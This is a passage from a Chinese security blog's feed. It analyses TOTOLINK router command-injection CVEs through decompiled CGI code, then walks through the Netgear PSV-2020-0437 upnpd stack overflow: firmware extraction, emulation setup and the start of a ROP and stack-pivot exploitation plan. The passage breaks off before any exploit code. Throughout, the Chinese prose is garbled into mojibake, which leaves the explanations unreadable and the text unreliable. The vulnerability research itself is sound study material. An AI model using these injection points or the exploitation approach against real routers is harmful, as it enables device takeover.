å¹¶ä¸”é¢˜ç›®çš„è¿™ä¸ªç‰ˆæœ¬æ˜¯å—åˆ°å½±å“çš„ã€‚è¿™é‡Œç®€å•åˆ†æä¸‹æˆ‘ä»¬ç”¨åˆ°çš„ä¸‰ä¸ªæ¼æ´</p><h3 id="totox-1-CVE-2021-27710"><a href="#totox-1-CVE-2021-27710" class="headerlink" title="totox/1 CVE-2021-27710"></a>totox/1 CVE-2021-27710</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.data:0044A520 aSettraceroutec:.ascii &quot;setTracerouteCfg&quot;&lt;0&gt;</span><br><span class="line">.data:0044A531                 .byte 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0</span><br><span class="line">.data:0044A531                 .byte 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0</span><br><span class="line">.data:0044A531                 .byte 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0</span><br><span class="line">.data:0044A560                 .word sub_41F6A0</span><br></pre></td></tr></table></figure><p>åœ¨cstecgi.cgiä¸­çš„<code>setTracerouteCfg</code> æ¥å£ä¼šè°ƒç”¨ <code>sub_41F6A0</code> å‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">sub_41F7E8</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *Var; <span class="comment">// $s2</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// $v0</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// $v0</span></span><br><span class="line">  <span class="keyword">char</span> v6[<span class="number">128</span>]; <span class="comment">// [sp+18h] [-80h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(v6, <span class="number">0</span>, <span class="keyword">sizeof</span>(v6));</span><br><span class="line">  Var = (<span class="keyword">const</span> <span class="keyword">char</span> *)websGetVar(a1, <span class="string">&quot;ip&quot;</span>, <span class="string">&quot;www.baidu.com&quot;</span>);</span><br><span class="line">  v3 = websGetVar(a1, <span class="string">&quot;num&quot;</span>, &amp;byte_437F70);</span><br><span class="line">  v4 = atoi(v3);</span><br><span class="line">  <span class="built_in">sprintf</span>(v6, <span class="string">&quot;ping %s -w %d &amp;&gt;/var/log/pingCheck&quot;</span>, Var, v4);</span><br><span class="line">  doSystem(v6);</span><br><span class="line">  setResponse(&amp;word_436104, <span class="string">&quot;reserv&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ­¤å¤„çš„ <code>ip</code> å‚æ•°å¯æ§ï¼Œå­˜åœ¨å‘½ä»¤æ³¨å…¥ã€‚</p><h3 id="totox-2-CVE-2021-27708"><a href="#totox-2-CVE-2021-27708" class="headerlink" title="totox/2 CVE-2021-27708"></a>totox/2 CVE-2021-27708</h3><p>åœ¨cstecgi.cgiä¸­çš„å‡½æ•° <code>sub_41F6A0</code> ï¼Œ å³ <code>setTracerouteCfg</code> æ¥å£æœ‰å¦‚ä¸‹ä»£ç </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *Var; <span class="comment">// $s2</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// $v0</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// $v0</span></span><br><span class="line">  <span class="keyword">char</span> v6[<span class="number">128</span>]; <span class="comment">// [sp+18h] [-80h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(v6, <span class="number">0</span>, <span class="keyword">sizeof</span>(v6));</span><br><span class="line">  Var = (<span class="keyword">const</span> <span class="keyword">char</span> *)websGetVar(a1, <span class="string">&quot;command&quot;</span>, <span class="string">&quot;www.baidu.com&quot;</span>);</span><br><span class="line">  v3 = websGetVar(a1, <span class="string">&quot;num&quot;</span>, &amp;byte_437F70);</span><br><span class="line">  v4 = atoi(v3);</span><br><span class="line">  <span class="built_in">sprintf</span>(v6, <span class="string">&quot;traceroute -m %d %s&amp;&gt;/var/log/traceRouteLog&quot;</span>, v4, Var);</span><br><span class="line">  doSystem(v6);</span><br><span class="line">  setResponse(&amp;word_436104, <span class="string">&quot;reserv&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ <code>command</code>  å‚æ•°å¯æ§ï¼Œ å­˜åœ¨å‘½ä»¤æ³¨å…¥ã€‚</p><h3 id="totox-3-CVE-2022-27005"><a href="#totox-3-CVE-2022-27005" class="headerlink" title="totox/3 CVE-2022-27005"></a>totox/3 CVE-2022-27005</h3><p>åœ¨cstecgi.cgiä¸­çš„ <code>setWanCfg</code> æ¥å£ä¸­ ï¼Œ å³ <code>sub_4212CC</code> å‡½æ•°é‡Œï¼Œæœ‰å¦‚ä¸‹ä»£ç ç‰‡æ–­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">default</span>:</span><br><span class="line">    <span class="built_in">strcpy</span>(v61, <span class="string">&quot;dhcp&quot;</span>);</span><br><span class="line">    v48 = (<span class="keyword">const</span> <span class="keyword">char</span> *)websGetVar(a1, <span class="string">&quot;hostName&quot;</span>, &amp;byte_437F70);</span><br><span class="line">    <span class="keyword">if</span> ( *v48 )</span><br><span class="line">    &#123;</span><br><span class="line">      nvram_set(<span class="string">&quot;wan_hostname&quot;</span>, v48);</span><br><span class="line">      doSystem(<span class="string">&quot;echo  &#x27;%s&#x27;  &gt; /proc/sys/kernel/hostname&quot;</span>, v48);</span><br><span class="line">    &#125;</span><br><span class="line">    v49 = websGetVar(a1, <span class="string">&quot;dhcpMtu&quot;</span>, <span class="string">&quot;1500&quot;</span>);</span><br><span class="line">    nvram_set(<span class="string">&quot;wan_mtu&quot;</span>, v49);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ï¼Œ <code>hostname</code> å¯è¢«ç”¨æˆ·æ§åˆ¶ï¼Œ å­˜åœ¨å‘½ä»¤æ³¨å…¥ã€‚</p><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a href="https://github.com/neutrinolabs/xrdp/commit/4def30ab8ea445cdc06832a44c3ec40a506a0ffa">CVE-2022-23613-Patched</a></p><p><a href="https://hackmd.io/KjXzQdjDRjOuRjoZZXQo_A">CVE-2021-27710 totolink command inject</a></p><p><a href="https://hackmd.io/7FtB06f-SJ-SCfkMYcXYxA">CVE-2021-27008 totolink command inject</a></p><p><a href="https://web.archive.org/web/20220322013544/https://github.com/wudipjq/my_vuln/blob/main/totolink/vuln_30/30.md">CVE-2022-27005 totolink command inject</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´åˆ†æ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> CVE-2022-23613 </tag>
            
            <tag> CVE-2022-27005 </tag>
            
            <tag> CVE-2021-27710 </tag>
            
            <tag> CVE-2021-27708 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PSV-2020-0437:Buffer-Overflow-on-Some-Netgear-Routers</title>
      <link href="PSV-2020-0437-Buffer-Overflow-on-Some-Netgear-outers.html"/>
      <url>PSV-2020-0437-Buffer-Overflow-on-Some-Netgear-outers.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è·ç¦»ä¸Šä¸€ç¯‡ Blog æ›´æ–°å·²ç»å¿«ä¸¤ä¸ªæœˆäº†ï¼Œæƒ³äº†æƒ³åº”è¯¥ç»™é•¿è‰çš„ Blog é™¤é™¤è‰äº†ã€‚äºæ˜¯ä»æˆ‘çš„ç¬”è®°æ–‡æ¡£é‡Œç¿»äº†ä¸€ä¸‹ï¼Œ æŠŠè¿™ä¸ªæ¼æ´ç¿»å‡ºæ¥ç»™å¤§å®¶åˆ†äº«åˆ†äº«ã€‚å…·ä½“å®˜æ–¹é€šå‘Šå¯ä»¥å‚è€ƒï¼š </p><p>ã€1ã€‘<a href="https://kb.netgear.com/000064493/Security-Advisory-for-Post-Authentication-Buffer-Overflow-on-Some-Routers-Extenders-and-WiFi-Systems-PSV-2020-0437">PSV-2020-0437 å®˜æ–¹å…¬å‘Š</a></p><p>å½“æ—¶æˆ‘çš„åˆ©ç”¨æ˜¯åœ¨ Netgear R6400v2 å›ºä»¶ç‰ˆæœ¬ä¸º 1.0.4.102 çš„ç¯å¢ƒä¸‹ç¼–å†™çš„ ï¼Œå› æ­¤æœ¬ç¯‡æ–‡ç« ä¹Ÿä»¥æ­¤ä¸ºåŸºç¡€è¿›è¡Œè®²è¿°ã€‚</p><h2 id="å›ºä»¶è·å–"><a href="#å›ºä»¶è·å–" class="headerlink" title="å›ºä»¶è·å–"></a>å›ºä»¶è·å–</h2><p>å›ºä»¶ä¸‹è½½é“¾æ¥: ã€2ã€‘<a href="https://www.downloads.netgear.com/files/GDC/R6400v2/R6400v2-V1.0.4.102_10.0.75.zip">R6400v2-1.0.4.102 å›ºä»¶</a></p><p>å½“æˆ‘ä»¬è·å–å›ºä»¶åï¼Œæˆ‘ä»¬éœ€è¦ä»ä¸­è§£å‹å‡ºæ–‡ä»¶ç³»ç»Ÿ ï¼Œ è¿™é‡Œæˆ‘é€šè¿‡ binwalk å’Œ unsquashfs æˆåŠŸæå–å‡ºå¯¹åº”çš„å›ºä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># swing @ swingdeiMac in ~/Downloads/PSV-2020-0437 [16:43:07]</span></span><br><span class="line">$ msl --run <span class="string">&quot;binwalk R6400v2-V1.0.4.102_10.0.75.chk -ez --run-as=root&quot;</span></span><br><span class="line">[check_container() - msl:93 ] Container status: running</span><br><span class="line">[main() - msl:139 ] Running <span class="built_in">command</span>: bash -c <span class="string">&quot;cd &#x27;/workhub/Downloads/PSV-2020-0437&#x27; ; binwalk R6400v2-V1.0.4.102_10.0.75.chk -ez --run-as=root&quot;</span></span><br><span class="line"></span><br><span class="line">__________               .__  .__  _____</span><br><span class="line">\______   \__  _  ______ |  | |__|/ ____\____</span><br><span class="line"> |     ___/\ \/ \/ /    \|  | |  \   __\/ __ \</span><br><span class="line"> |    |     \     /   |  \  |_|  ||  | \  ___/</span><br><span class="line"> |____|      \/\_/|___|  /____/__||__|  \___  &gt;</span><br><span class="line">                       \/                   \/</span><br><span class="line">                                 no pwn no life</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">58            0x3A            TRX firmware header, little endian, image size: 46354432 bytes, CRC32: 0x93E72BAF, flags: 0x0, version: 1, header size: 28 bytes, loader offset: 0x1C, linux kernel offset: 0x20BCFC, rootfs offset: 0x0</span><br><span class="line">86            0x56            LZMA compressed data, properties: 0x5D, dictionary size: 65536 bytes, uncompressed size: 5276608 bytes</span><br><span class="line">2145590       0x20BD36        Squashfs filesystem, little endian, version 4.0, compression:xz, size: 44208035 bytes, 1807 inodes, blocksize: 131072 bytes, created: 2020-09-22 07:41:07</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># root @ docker-desktop in /workhub/Downloads/PSV-2020-0437/_R6400v2-V1.0.4.102_10.0.75.chk.extracted [8:44:40]</span></span><br><span class="line">$ ls</span><br><span class="line">20BD36.squashfs  56.7z</span><br><span class="line"></span><br><span class="line"><span class="comment"># root @ docker-desktop in /workhub/Downloads/PSV-2020-0437/_R6400v2-V1.0.4.102_10.0.75.chk.extracted [8:44:43]</span></span><br><span class="line">$ unsquashfs 20BD36.squashfs</span><br><span class="line">Parallel unsquashfs: Using 8 processors</span><br><span class="line">1694 inodes (2629 blocks) to write</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">write_xattr: failed to write xattr security.selinux <span class="keyword">for</span> file squashfs-root/bin/addgroup because extended attributes are not supported by the destination filesystem</span><br><span class="line"></span><br><span class="line">Ignoring xattrs <span class="keyword">in</span> filesystem</span><br><span class="line"></span><br><span class="line">To avoid this error message, specify -no-xattrs</span><br><span class="line">[==========================================================================================================================================================================================================================| ] 2628/2629  99%</span><br><span class="line"></span><br><span class="line"><span class="comment"># root @ docker-desktop in /workhub/Downloads/PSV-2020-0437/_R6400v2-V1.0.4.102_10.0.75.chk.extracted [8:44:50] C:2</span></span><br><span class="line">$ ls squashfs-root</span><br><span class="line">bin  data  dev  etc  lib  media  mnt  opt  proc  sbin  share  sys  tmp  usr  var  www</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="æ¼æ´ä»‹ç»"><a href="#æ¼æ´ä»‹ç»" class="headerlink" title="æ¼æ´ä»‹ç»"></a>æ¼æ´ä»‹ç»</h2><p>ä¼—æ‰€å‘¨çŸ¥ UPNPç›¸å…³çš„ç¨‹åºåœ¨è·¯ç”±å™¨ä¸Šæ˜¯ç»å¸¸å‡ºç°æ¼æ´çš„ã€‚è¿™æ¬¡ä¹Ÿä¸ä¾‹å¤–ï¼Œ PSV-2020-0437 çš„æ¼æ´ä¹Ÿæ˜¯å‡ºç°åœ¨ UPNP çš„ç›¸å…³å¤„ç†ä»£ç ä¸­ã€‚æˆ‘ä»¬ä»åˆšè§£å‹å‡ºæ¥çš„æ–‡ä»¶ç³»ç»Ÿä¸­æå–å‡º upnpd ç¨‹åºï¼Œ ç„¶åæˆ‘ä»¬ç”¨ ida pro æ‰“å¼€ã€‚</p><p>æˆ‘ä»¬é€šè¿‡å¯¹ <code>recvfrom</code> äº¤å‰å¼•ç”¨ï¼Œ æ‰¾åˆ°ç¨‹åºçš„å…¥å£ï¼Œ å¯ä»¥çœ‹è¯¥ç¨‹åºä¸€å¼€å§‹å¯è¯»å…¥å¤§å°ä¸º 0x1fff ã€‚ </p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-06-28-4f5f19e512603a50cdad71767a640d93-4d05b2.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-06-28-4f5f19e512603a50cdad71767a640d93-4d05b2.png"></a></p><p>ç„¶åæˆ‘ä»¬è·Ÿç€æ•°æ®æµï¼Œ å³ <code>inputBuf</code>  ï¼Œæˆ‘ä»¬çœ‹åˆ°ç¨‹åºä¼šè°ƒç”¨ <code>ssdp_http_method_check</code> å‡½æ•°</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-06-28-90a47c3ad6603c1ba944071dad48f657-062389.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-06-28-90a47c3ad6603c1ba944071dad48f657-062389.png"></a></p><p>è¯¥å‡½æ•°ä¼šå¯¹è¾“å…¥çš„æ•°æ®è¿›è¡Œéƒ¨åˆ†è§£æï¼Œä¾‹å¦‚ <code>M-SEARCH</code> ã€<code>ssdp:discover</code>  ç­‰å…³é”®è¯ï¼Œ æœ¬æ¬¡çš„æ¼æ´æ˜¯åœ¨ <code>sub_22D20</code> å‡½æ•°ä¸­å‘ç”Ÿçš„ï¼Œ æˆ‘ä»¬ç‚¹è¿›å»æŸ¥çœ‹ä¸‹è¿™ä¸ªå‡½æ•°ã€‚</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-06-28-809c95a4a9780fe12cceb4b95900e51a-9da086.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-06-28-809c95a4a9780fe12cceb4b95900e51a-9da086.png"></a></p><p>é€šè¿‡é˜…è¯»ä¸Šé¢çš„ä»£ç ï¼Œ æˆ‘ä»¬ä¼šå‘ç°è¯¥å‡½æ•°åœ¨</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">strncpy</span>((<span class="keyword">char</span> *)v6, (<span class="keyword">const</span> <span class="keyword">char</span> *)(MXstart + <span class="number">3</span>), end - (MXstart + <span class="number">3</span>));</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>strncpy</code> çš„æ—¶å€™ï¼Œæ‹·è´çš„é•¿åº¦è®¡ç®—ä¸Šå¤„ç†ä¸å½“ï¼Œä¼šåœ¨æ­¤å¤„äº§ç”Ÿæ ˆæº¢å‡ºã€‚</p><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p>ç”±äºå½“æ—¶æ‰‹å¤´æ²¡æœ‰ RV6400v2 çš„è®¾å¤‡ï¼Œ å› æ­¤æˆ‘é‡‡å–ä½¿ç”¨ qemu-user è¿›è¡Œæ¨¡æ‹Ÿçš„æ–¹æ¡ˆã€‚ </p><p>å…·ä½“å‡ ä¸ªè¸©å‘ä»¥åŠè§£å†³æ–¹æ¡ˆå¦‚ä¸‹ï¼š</p><ol><li><code>/dev/nvram: No such file or directory</code></li></ol><p>ç”±äº netgear ä½¿ç”¨åˆ°äº† NVRAM ï¼Œ å› æ­¤æˆ‘ä»¬éœ€è¦ hook ä¸‹ NVRAM ç›¸å…³çš„å‡½æ•°ï¼Œ è¿™é‡Œæˆ‘ç”¨çš„ä¸€ä¸ªç½‘ä¸Šç¼–è¯‘å¥½çš„å®ç° ï¼šã€3ã€‘ <a href="https://github.com/therealsaumil/custom_nvram">Shared Library to intercept nvram</a></p><ol start="2"><li>ç¼ºå¤±ç¬¦å·</li></ol><p>æ‰¾ä¸åˆ° dlsym çš„ç¬¦å·ã€‚ä¹‹æ‰€ä»¥ä¼šç”¨åˆ° dlsymï¼Œæ˜¯å› ä¸ºè¯¥åº“çš„å®ç°è€…è¿˜åŒæ—¶ hook äº† systemã€fopenã€open ç­‰å‡½æ•°</p><p><code>/lib/libdl.so.0</code> å¯¼å‡ºäº†è¯¥ç¬¦å·,æ‰€ä»¥ LD_PRELOAD çš„æ—¶å€™æŠŠè¿™ä¸ªä¹ŸåŠ ä¸Š</p><ol start="3"><li>ç¼ºå°‘ä¸€äº›ç›®å½•ä»¥åŠé…ç½®ä¿¡æ¯</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cat tmp/nvram.ini</span></span><br><span class="line">upnpd_debug_level=9</span><br><span class="line">lan_ipaddr=172.19.32.152</span><br><span class="line">hwver=R6400</span><br><span class="line">friendly_name=R6400</span><br><span class="line">upnp_enable=1</span><br><span class="line">upnp_turn_on=1</span><br><span class="line">upnp_advert_period=30</span><br><span class="line">upnp_advert_ttl=4</span><br><span class="line">upnp_portmap_entry=1</span><br><span class="line">upnp_duration=3600</span><br><span class="line">upnp_DHCPServerConfigurable=1</span><br><span class="line">wps_is_upnp=0</span><br><span class="line">upnp_sa_uuid=00000000000000000000</span><br><span class="line">lan_hwaddr=AA:BB:CC:DD:EE:FF</span><br></pre></td></tr></table></figure><ol start="4"><li>æŒ‚è½½ /proc /dev ç›®å½•<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mount -t proc /proc ./squashfs-root/proc</span><br><span class="line">mount -o <span class="built_in">bind</span> /dev ./squashfs-root/dev</span><br></pre></td></tr></table></figure></li></ol><p>åˆ°è¿™æˆ‘ä»¬å°±åŸºæœ¬åˆ©ç”¨æ­£å¸¸è¿è¡Œ upnpd ç¨‹åºäº†ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># root @ server in /home/squashfs-root [19:32:11]</span></span><br><span class="line">$ chroot . sh</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BusyBox v1.7.2 (2020-09-18 17:38:05 CST) built-in shell (ash)</span><br><span class="line">Enter <span class="string">&#x27;help&#x27;</span> <span class="keyword">for</span> a list of built-in commands.</span><br><span class="line"></span><br><span class="line"><span class="comment"># LD_PRELOAD=&quot;/custom_nvram.so /lib/libdl.so.0&quot; ./usr/sbin/upnpd</span></span><br><span class="line"><span class="comment"># [0x0002465c] fopen(&#x27;/var/run/upnpd.pid&#x27;, &#x27;wb+&#x27;) = 0x000db150</span></span><br><span class="line">[0x00024688] custom_nvram initialised</span><br><span class="line">[0xff757d34] fopen(<span class="string">&#x27;/tmp/nvram.ini&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) = 0x000db150</span><br><span class="line">[nvram 0] upnpd_debug_level = 9</span><br><span class="line">[nvram 1] lan_ipaddr = 127.0.0.1</span><br><span class="line">[nvram 2] hwver = R6400</span><br><span class="line">[nvram 3] friendly_name = R6400</span><br><span class="line">[nvram 4] upnp_enable = 1</span><br><span class="line">[nvram 5] upnp_turn_on = 1</span><br><span class="line">[nvram 6] upnp_advert_period = 30</span><br><span class="line">[nvram 7] upnp_advert_ttl = 4</span><br><span class="line">[nvram 8] upnp_portmap_entry = 1</span><br><span class="line">[nvram 9] upnp_duration = 3600</span><br><span class="line">[nvram 10] upnp_DHCPServerConfigurable = 1</span><br><span class="line">[nvram 11] wps_is_upnp = 0</span><br><span class="line">[nvram 12] upnp_sa_uuid = 00000000000000000000</span><br><span class="line">[nvram 13] lan_hwaddr = AA:BB:CC:DD:EE:FF</span><br><span class="line">[nvram 14] lan_hwaddr =</span><br><span class="line">Read 15 entries from /tmp/nvram.ini</span><br><span class="line">acosNvramConfig_get(<span class="string">&#x27;upnpd_debug_level&#x27;</span>) = <span class="string">&#x27;9&#x27;</span></span><br><span class="line">[0x00024728] acosNvramConfig_get(<span class="string">&#x27;upnpd_debug_level&#x27;</span>) = <span class="string">&#x27;9&#x27;</span></span><br><span class="line">set_value_to_org_xml:1136()</span><br><span class="line">[0x0000e5e8] fopen(<span class="string">&#x27;/www/Public_UPNP_gatedesc.xml&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) = 0x000db150</span><br><span class="line">[0x0000e620] fopen(<span class="string">&#x27;/tmp/upnp_xml&#x27;</span>, <span class="string">&#x27;wb+&#x27;</span>) = 0x000db150</span><br><span class="line">data2XML()</span><br><span class="line">[0x0000f7d0] acosNvramConfig_get(<span class="string">&#x27;lan_ipaddr&#x27;</span>) = <span class="string">&#x27;127.0.0.1&#x27;</span></span><br></pre></td></tr></table></figure><p>PS: æ“ä½œçš„è¿‡ç¨‹æ²¡æœ‰çœ‹åˆ° qemuï¼Œ é‚£æ˜¯å› ä¸ºæˆ‘ç³»ç»Ÿæœ‰ qemu binfmt çš„æ”¯æŒã€‚</p><h2 id="åˆ©ç”¨ç¼–å†™"><a href="#åˆ©ç”¨ç¼–å†™" class="headerlink" title="åˆ©ç”¨ç¼–å†™"></a>åˆ©ç”¨ç¼–å†™</h2><p>ç”±äºæ¼æ´çš„æ ¹æœ¬åŸå› æ˜¯ <code>strncpy</code> çš„ç¼“å†²åŒºæº¢å‡ºï¼Œ æˆ‘ä»¬çŸ¥é“ <code>strncpy</code> å‡½æ•°åœ¨æº¢å‡ºçš„æ—¶å€™ä¼šå­˜åœ¨ <code>\x00</code> æˆªæ–­ã€‚ç„¶è€Œç¨‹åºæ¯æ¬¡ä¸åŒé“¾æ¥ä½¿ç”¨çš„æ˜¯åŒä¸€å—å†…å­˜ï¼Œ æˆ‘ä»¬å¯ä»¥åœ¨ç¬¬ä¸€æ¬¡ <code>recvfrom</code> çš„æ—¶å€™åœ¨æ ˆä¸Šå¸ƒå±€å¥½ rop, ç„¶åé€šè¿‡æ ˆè¿ç§»è·³è½¬åˆ°å¸ƒå±€å¥½çš„ rop ä¸Šã€‚</p><ol><li>ç¬¬ä¸€æ¬¡è¿æ¥å¸ƒå±€å¥½ rop</li><li>ç¬¬äºŒæ¬¡è¿æ¥, æ„é€ ç¼“å†²åŒºæº¢å‡ºï¼Œæ ˆè¿ç§»åˆ° rop ä¸Šï¼Œç„¶åæ‰§è¡Œä»»æ„å‘½ä»¤</li></ol><p>æ•´ä½“æ€è·¯å¯ä»¥å‚è€ƒ ã€4ã€‘<a href="https://ssd-disclosure.com/ssd-advisory-netgear-nighthawk-r8300-upnpd-preauth-rce/">SSD Advisory - Netgear Nighthawk R8300 upnpd PreAuth RCE - SSD Secure Disclosure (ssd-disclosure.com)</a></p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-06-28-72c8aa776b04fb7ce53044c6d1e8728d-c1cff6.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-06-28-72c8aa776b04fb7ce53044c6d1e8728d-c1cff6.png"></a></p><p>æ˜ç¡®äº†æ€è·¯æˆ‘ä»¬å°±éœ€è¦å¼€å§‹æ„é€  ropï¼Œ æ‰¾é½æ‰€éœ€çš„ gadget ã€‚</p><p>é€šè¿‡æŸ¥çœ‹ <code>sub_22D20</code> å‡½æ•°è¿”å›çš„åœ°æ–¹æ±‡ç¼–å¯çŸ¥ï¼Œ æ ˆæº¢å‡ºåï¼Œæˆ‘ä»¬å¯æ§çš„å¯„å­˜å™¨ä¸º <code>R4ã€R5ã€R6ã€PC</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">loc_22DB8</span><br><span class="line">MOV             R0, R4</span><br><span class="line">ADD             SP, SP, #0x80</span><br><span class="line">POP             &#123;R4-R6,PC&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ <code>PC</code> å¯„å­˜å™¨ä¸ºéœ€è¦çš„æ ˆè¿ç§» gadget </p><figure class="highlight 